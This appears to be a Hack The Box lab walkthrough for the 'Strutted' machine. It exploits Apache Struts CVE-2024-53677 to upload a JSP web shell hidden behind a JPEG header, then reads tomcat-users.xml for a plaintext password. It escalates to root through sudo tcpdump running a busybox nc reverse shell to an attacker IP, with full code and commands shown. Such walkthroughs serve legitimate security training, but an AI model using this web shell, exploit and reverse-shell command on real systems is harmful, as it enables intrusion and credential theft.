I start with a port scan
```bash
nmap -p 22,80 -sC -sV 10.10.11.59    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 12:26 EST
Nmap scan report for strutted.htb (10.10.11.59)
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Strutted\xE2\x84\xA2 - Instant Image Uploads
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.09 seconds
```
Ok so we got ssh and a website. Lets visit the website. It's a image hosting website and it lets us download the environment in the /download

I downloaded it and saw that the Framework that is used is Apache Struts and version 6.3.0.1 I looked for CVE's of that specific version and found CVE-2024-53677. It basically allows us to bypass restrictions and upload maliscious files into the system.

First i setup the venv so i could install the requirements.

```bash
python3 -m venv venv
source venv/bin/activate

pip install -r requirements.txt
```

Ok first we create the file with the maliscious content

```bash
──(venv)─(kali㉿kali)-[~/Downloads/CVE-2024-53677]
└─$ printf "\xff\xd8\xff\n" > cat.png                                             
                                                                                                                    
┌──(venv)─(kali㉿kali)-[~/Downloads/CVE-2024-53677]
└─$ cat exploit_file.jsp >> cat.png 
                                                                                                                    
┌──(venv)─(kali㉿kali)-[~/Downloads/CVE-2024-53677]
└─$ cat cat.png                    
���
<%@ page import="java.io.*, java.util.*, java.net.*" %>
<%
    String action = request.getParameter("action");
    String output = "";

    try {
        if ("cmd".equals(action)) {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                Process p = Runtime.getRuntime().exec(cmd);
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output += line + "\\n";
                }
                reader.close();
            }
        } else {
            output = "Unknown action.";
        }
    } catch (Exception e) {
        output = "Error: " + e.getMessage();
    }
    response.setContentType("text/plain");
    out.print(output);
%>
```

Then we just use the script instead of doing it manually through burpsuite.

```bash
 python3 CVE-2024-53677.py -u http://strutted.htb/upload.action -p "../exploit_file.jsp" -f cat.png

<h1>Image Upload Successful!</h1>
                <p>Congratulations! Your image has been securely uploaded and is now accessible via a shareable link.</p>
```

Ok it was successful. Now lets visit the site and see if we got command execution
This is odd. It says that the file was uploaded successfully but its says that it's not found.

Ok I figured it out i just had forgotten to change the file name in the prewritten script.


```bash
curl 'http://strutted.htb/exploit_file.jsp?action=cmd&cmd=id'
ÿØÿ

uid=998(tomcat) gid=998(tomcat) groups=998(tomcat)\n
```

I decided to lookup tomcat config file path from the internet.


```bash
curl 'http://strutted.htb/exploit_file.jsp?action=cmd&cmd=cat%20conf/tomcat-users.xml' 
ÿØÿ

<?xml version="1.0" encoding="UTF-8"?>\n<!--\n  Licensed to the Apache Software Foundation (ASF) under one or more\n  contributor license agreements.  See the NOTICE file distributed with\n  this work for additional information regarding copyright ownership.\n  The ASF licenses this file to You under the Apache License, Version 2.0\n  (the "License"); you may not use this file except in compliance with\n  the License.  You may obtain a copy of the License at\n\n      http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an "AS IS" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n  See the License for the specific language governing permissions and\n  limitations under the License.\n-->\n<tomcat-users xmlns="http://tomcat.apache.org/xml"\n              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"\n              version="1.0">\n<!--\n  By default, no user is included in the "manager-gui" role required\n  to operate the "/manager/html" web application.  If you wish to use this app,\n  you must define such a user - the username and password are arbitrary.\n\n  Built-in Tomcat manager roles:\n    - manager-gui    - allows access to the HTML GUI and the status pages\n    - manager-script - allows access to the HTTP API and the status pages\n    - manager-jmx    - allows access to the JMX proxy and the status pages\n    - manager-status - allows access to the status pages only\n\n  The users below are wrapped in a comment and are therefore ignored. If you\n  wish to configure one or more of these users for use with the manager web\n  application, do not forget to remove the <!.. ..> that surrounds them. You\n  will also need to set the passwords to something appropriate.\n-->\n<!--\n  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>\n  <user username="robot" password="<must-be-changed>" roles="manager-script"/>\n  <role rolename="manager-gui"/>\n  <role rolename="admin-gui"/>\n  <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>\n--->\n<!--\n  The sample user and role entries below are intended for use with the\n  examples web application. They are wrapped in a comment and thus are ignored\n  when reading this file. If you wish to configure these users for use with the\n  examples web application, do not forget to remove the <!.. ..> that surrounds\n  them. You will also need to set the passwords to something appropriate.\n-->\n<!--\n  <role rolename="tomcat"/>\n  <role rolename="role1"/>\n  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>\n  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>\n  <user username="role1" password="<must-be-changed>" roles="role1"/>\n-->\n</tomcat-users>\n
```


There we can see a password in plaintext 'IT14d6SSP81k' Not sure which account it's for though.

```bash
curl 'http://strutted.htb/exploit_file.jsp?action=cmd&cmd=ls%20/home'
ÿØÿ

james
```

Ok so its for james most likely. 

We got the user.txt
```bash
cat user.txt 
49a65f*********d09c3ea19dde8e4e40
```

We can run tcpdump as sudo
```bash
sudo -l
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```
https://gtfobins.github.io/gtfobins/tcpdump/

Ok so since we are allowed to run tcpdump as supersuer we are able to access the file systems with privileged access. 

I could be boring and just try to get the root.txt with cat but i decided to try to get the .ssh key instead of root since there is the port 22 open. If i dont get it i'll just do it the boring way. 



```bash
COMMAND='busybox nc 10.10.14.42 4444 -e /bin/bash'
james@strutted:/tmp$ echo "$COMMAND" > $TF
james@strutted:/tmp$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```


```bash
lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.11.59] 54096
whoami
root
cat /root/root.txt
3efe88e1*****d3a317d13cb270d84393
```


